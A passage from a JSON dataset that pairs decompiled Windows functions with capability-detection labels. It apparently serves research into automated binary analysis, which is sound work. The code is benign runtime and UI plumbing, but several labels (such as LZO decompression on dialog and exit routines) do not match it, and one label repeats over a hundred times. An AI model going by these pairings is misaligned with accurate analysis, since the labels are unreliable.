        "decompiled_code": "\nvoid __thiscall fcn.00427fde(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                while (piVar3 = *ppiVar1,  piVar3 == NULL) {\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                    if (*(param_1 + 8) <= uVar4) {\n                        *param_2 = NULL;\n                        return;\n                    }\n                }\n            }\n        }\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        *param_3 = piVar3[1];\n        *param_4 = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "0042d8f6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d8f6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.004012e0();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(*(param_1 + 0xc));\n        fcn.0042e873(uVar2);\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0042daaf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_15ch\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n// WARNING: Variable defined which should be unmapped: lpFilePart\n// WARNING: Variable defined which should be unmapped: var_158h\n\nvoid __cdecl fcn.0042daaf(uint lpRootPathName, uint lpFileName)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_15ch;\n    uint var_158h;\n    uint lpFilePart;\n    uint lpFindFileData;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    uVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = *0x444220;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(*(unaff_EBP + 0xc), 0x104, uVar1, unaff_EBP + -0x154);\n    if (uVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, *(unaff_EBP + 0xc), 0x104);\n    }\n    else if (uVar2 < 0x104) {\n        piVar3 = fcn.00428235();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + 8) = iVar4 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.0042da6d(uVar1, unaff_EBP + 8);\n        iVar4 = (*_sym.imp.SHLWAPI.dll_PathIsUNCA)(*(unaff_EBP + 8));\n        if ((iVar4 == 0) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)\n                              (*(unaff_EBP + 8), 0, 0, 0, unaff_EBP + -0x15c, unaff_EBP + -0x158, 0, 0),  iVar4 != 0)) {\n            if ((*(unaff_EBP + -0x158) & 2) == 0) {\n                (*_sym.imp.USER32.dll_CharUpperA)(uVar1);\n            }\n            if (((((*(unaff_EBP + -0x158) & 4) == 0) &&\n                 (iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(*(unaff_EBP + 0xc), unaff_EBP + -0x150),  iVar4 != -1)\n                 ) && ((*_sym.imp.KERNEL32.dll_FindClose)(iVar4),  *(unaff_EBP + -0x154) != 0)) &&\n               ((uVar1 <= *(unaff_EBP + -0x154) && *(unaff_EBP + -0x154) != uVar1 &&\n                (iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(unaff_EBP + -0x124), \n                (iVar4 - uVar1) + *(unaff_EBP + -0x154) < 0x104)))) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(*(unaff_EBP + -0x154), unaff_EBP + -0x124);\n            }\n        }\n        fcn.004011b0();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 840
    },
    "0042e894": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e894(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t *puVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.0041cc60(arg_8h, 0, 0x128);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_8h + 0x22, *(in_ECX + 0xc), 0x104);\n    if (*(in_ECX + 4) == *0x439ba4) {\ncode_r0x0042e99b:\n        uVar3 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[6] = uVar2;\n            arg_8h[7] = 0;\n            if (uVar2 != 0xffffffff) {\n                if (*(*(in_ECX + 0xc) + -0xc) == 0) {\n                    *(arg_8h + 8) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    *(arg_8h + 8) = (iVar1 == -1) - 1U & iVar1;\n                }\n                puVar4 = fcn.0041adde(&lpCreationTime, 0xffffffff);\n                *arg_8h = *puVar4;\n                arg_8h[1] = puVar4[1];\n                puVar4 = fcn.0041adde(&lpLastAccessTime, 0xffffffff);\n                arg_8h[4] = *puVar4;\n                arg_8h[5] = puVar4[1];\n                puVar4 = fcn.0041adde(&lpLastWriteTime, 0xffffffff);\n                arg_8h[2] = *puVar4;\n                arg_8h[3] = puVar4[1];\n                if ((*arg_8h | arg_8h[1]) == 0) {\n                    *arg_8h = *puVar4;\n                    arg_8h[1] = puVar4[1];\n                }\n                if ((arg_8h[4] | arg_8h[5]) == 0) {\n                    arg_8h[4] = arg_8h[2];\n                    arg_8h[5] = arg_8h[3];\n                }\n                goto code_r0x0042e99b;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 689
    },
    "004300af": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004300af(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    piVar1 = fcn.00428235(extraout_ECX);\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    fcn.00401980(*(unaff_EBP + 8));\n    iVar2 = *(unaff_EBP + 0x10);\n    if (iVar2 == -1) {\n        iVar2 = *(unaff_EBP + 8);\n    }\n    uVar3 = fcn.0043008d(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), iVar2);\n    fcn.004011b0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 338
    },
    "00430c17": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430c17(uint arg_8h, int32_t Locale)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint lpLibFileName;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    if (Locale == 0x800) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(&Locale, 0x43833c);\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 3, &Locale, 4);\n        if (iVar2 == 0) goto code_r0x00430c8c;\n    }\n    uVar1 = fcn.0041c9d9(&lpLibFileName, 0x112, arg_8h, &Locale);\n    if ((uVar1 != 0xffffffff) && (uVar1 < 0x112)) {\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    }\ncode_r0x00430c8c:\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 252
    },
    "004326e4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004326e4(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar3;\n    if (iVar3 == -1) {\n        uStack12 = 0x447678;\n        fcn.0041c011(&stack0xfffffff4, 0x43f418);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    uStack12 = 0x432722;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return param_1;\n}\n",
        "token_count": 257
    },
    "00432a43": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432a43(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.004328ab(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 229
    },
    "004121bb": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n\nvoid __cdecl\nfcn.004121bb(uint arg_8h, uint hWndInsertAfter, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    ushort uVar1;\n    ushort uVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *in_FS_OFFSET;\n    uint var_94h;\n    uint var_6ch;\n    uint lpRect;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ah;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint pbstr;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    puVar11 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x10) = *0x444220;\n    *(unaff_EBP + -0x34) = puVar11 + 0x12;\n    if (*(unaff_EBP + 0x10) != 0) {\n        uVar1 = *(puVar11 + 0x12);\n        *(unaff_EBP + -0x58) = puVar11[2];\n        *(unaff_EBP + -0x54) = puVar11[1];\n        *(unaff_EBP + -0x50) = *(puVar11 + 3);\n        *(unaff_EBP + -0x4e) = *(puVar11 + 0xe);\n        uVar2 = *(puVar11 + 4);\n        *(unaff_EBP + -0x4a) = uVar1;\n        uVar1 = *(puVar11 + 5);\n        puVar9 = puVar11 + 6;\n        *(unaff_EBP + -0x4c) = uVar2;\n        *(unaff_EBP + -0x48) = uVar1;\n        puVar11 = unaff_EBP + -0x58;\n        *(unaff_EBP + -0x34) = puVar9;\n    }\n    iVar3 = *(puVar11 + 10);\n    iVar4 = *(puVar11 + 3);\n    iVar5 = *(puVar11 + 2);\n    *(unaff_EBP + -0x5c) = *(puVar11 + 0xe) + iVar3;\n    iVar10 = *(*(unaff_EBP + 8) + 0x1c);\n    *(unaff_EBP + -0x68) = iVar5;\n    *(unaff_EBP + -100) = iVar3;\n    *(unaff_EBP + -0x60) = iVar4 + iVar5;\n    (*_sym.imp.USER32.dll_MapDialogRect)(iVar10, unaff_EBP + -0x68);\n    arg_8h_00 = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0x28) = 0;\n    if (3 < *(unaff_EBP + 0x20)) {\n        iVar8 = *arg_8h_00;\n        *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) + -4;\n        arg_8h_00 = arg_8h_00 + 1;\n        if (iVar8 != 0) {\n            uVar6 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)(arg_8h_00, iVar8);\n            arg_8h_00 = arg_8h_00 + iVar8 * 2;\n            *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) + iVar8 * -2;\n            *(unaff_EBP + -0x28) = uVar6;\n        }\n    }\n    *(unaff_EBP + -0x2c) = 0;\n    piVar7 = fcn.00428235();\n    iVar8 = (**(*piVar7 + 0xc))();\n    *(unaff_EBP + 0x14) = iVar8 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    if ((*(unaff_EBP + 0x18) == 0x37a) || (*(unaff_EBP + 0x18) == 0x37b)) {\n        iVar8 = *arg_8h_00;\n        arg_8h_00 = arg_8h_00 + 3;\n        *(unaff_EBP + -0x40) = iVar8;\n        *(unaff_EBP + 0x1c) = iVar8 + -0xc;\n        piVar7 = arg_8h_00;\n        if (iVar8 + -0xc != 0) {\n            do {\n                iVar8 = *piVar7;\n                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + -6;\n                uVar1 = *(piVar7 + 1);\n                arg_8h_00 = piVar7 + 6;\n                *(unaff_EBP + -0x44) = iVar8;\n                *(unaff_EBP + 0x10) = uVar1;\n                if (iVar8 == -0x7ffeffff) {\n                    *(unaff_EBP + -0x3c) = *arg_8h_00;\n                    iVar10 = piVar7 + 0x16;\n                    *(unaff_EBP + -0x30) = *(piVar7 + 10);\n                    fcn.00401a60();\n                    iVar8 = *(*(unaff_EBP + 0x14) + -0xc);\n                    *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + (-0x11 - iVar8);\n                    arg_8h_00 = piVar7 + iVar8 + 0x17;\n                    *(unaff_EBP + -0x38) = *(unaff_EBP + 0x10);\n                }\n                else {\n                    iVar8 = fcn.00428fb1(0x1c);\n                    *(unaff_EBP + -0x6c) = iVar8;\n                    *(unaff_EBP + -4) = 1;\n                    if (iVar8 == 0) {\n                        uVar6 = 0;\n                    }\n                    else {\n                        iVar10 = *(unaff_EBP + -0x2c);\n                        uVar6 = fcn.00415ebf();\n                    }\n                    *(unaff_EBP + -4) = 0;\n                    *(unaff_EBP + -0x2c) = uVar6;\n                }\n                piVar7 = arg_8h_00;\n            } while (*(unaff_EBP + 0x1c) != 0);\n            iVar8 = *(unaff_EBP + -0x40);\n        }\n        *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) - iVar8;\n        *(unaff_EBP + 0x18) = *(unaff_EBP + 0x18) + 0xfffc;\n    }\n    if (**(unaff_EBP + -0x34) == 0x7b) {\n        uVar6 = (*_sym.imp.ole32.dll_CLSIDFromString)();\n    }\n    else {\n        uVar6 = (*_sym.imp.ole32.dll_CLSIDFromProgID)(*(unaff_EBP + -0x34), unaff_EBP + -0x20, iVar10);\n    }\n    *(unaff_EBP + 0x1c) = uVar6;\n    fcn.0043033c(arg_8h_00, *(unaff_EBP + 0x20), 0);\n    iVar3 = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x24) = 0;\n    if (((-1 < *(unaff_EBP + 0x1c)) && (iVar10 = fcn.00413d3a(),  iVar10 != 0)) &&\n       (iVar10 = fcn.004146df(0, unaff_EBP + -0x20, 0, *puVar11, unaff_EBP + -0x68, *(puVar11 + 4), \n                              -(iVar3 != 0x378) & unaff_EBP - 0x94U, *(unaff_EBP + 0x18) == 0x377, *(unaff_EBP + -0x28)\n                              , unaff_EBP + -0x24),  iVar10 != 0)) {\n        fcn.004153c6(1);\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(*(unaff_EBP + -0x24) + 0x20), *(unaff_EBP + 0xc), 0, 0, 0, 0, 0x13);\n        *(*(unaff_EBP + -0x24) + 0x90) = *(unaff_EBP + -0x2c);\n        fcn.004019f0(unaff_EBP + 0x14);\n        *(*(unaff_EBP + -0x24) + 0x94) = *(unaff_EBP + -0x38);\n        *(*(unaff_EBP + -0x24) + 0x98) = *(unaff_EBP + -0x3c);\n        *(*(unaff_EBP + -0x24) + 0x9c) = *(unaff_EBP + -0x30);\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x28));\n    }\n    if (*(unaff_EBP + -0x24) == 0) {\n        **(unaff_EBP + 0x24) = 0;\n    }\n    else {\n        **(unaff_EBP + 0x24) = *(*(unaff_EBP + -0x24) + 0x20);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.004306a7();\n    fcn.004011b0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 2558
    },
    "0041cb28": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0041cbba: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0041cbbf)\n// WARNING: Removing unreachable block (ram,0x0041cbe5)\n// WARNING: Removing unreachable block (ram,0x0041cbc4)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041cb28(uint uExitCode, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ae38, 8);\n    fcn.0041f23f(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x449678 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(unaff_EBP + 8));\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x449674 = 1;\n    *0x449670 = *(unaff_EBP + 0x10);\n    if (*(unaff_EBP + 0xc) == 0) {\n        if (*0x44af08 != NULL) {\n            while( true ) {\n                *0x44af04 = *0x44af04 + -1;\n                if (*0x44af04 < *0x44af08) break;\n                if (**0x44af04 != NULL) {\n                    (***0x44af04)();\n                }\n            }\n        }\n        fcn.0041caa6(0x443090);\n    }\n    fcn.0041caa6(0x44309c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0041f18a(8);\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "00424962": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00424962(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = param_1 + (param_2 / 0x20) * 4;\n    iVar1 = fcn.00425b5b(*puVar3, 1 << (0x1fU - param_2 % 0x20 & 0x1f), puVar3);\n    iVar2 = param_2 / 0x20 + -1;\n    if (-1 < iVar2) {\n        puVar3 = param_1 + iVar2 * 4;\n        do {\n            if (iVar1 == 0) {\n                return;\n            }\n            iVar1 = fcn.00425b5b(*puVar3, 1, puVar3);\n            iVar2 = iVar2 + -1;\n            puVar3 = puVar3 + -1;\n        } while (-1 < iVar2);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "0041b4b6": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
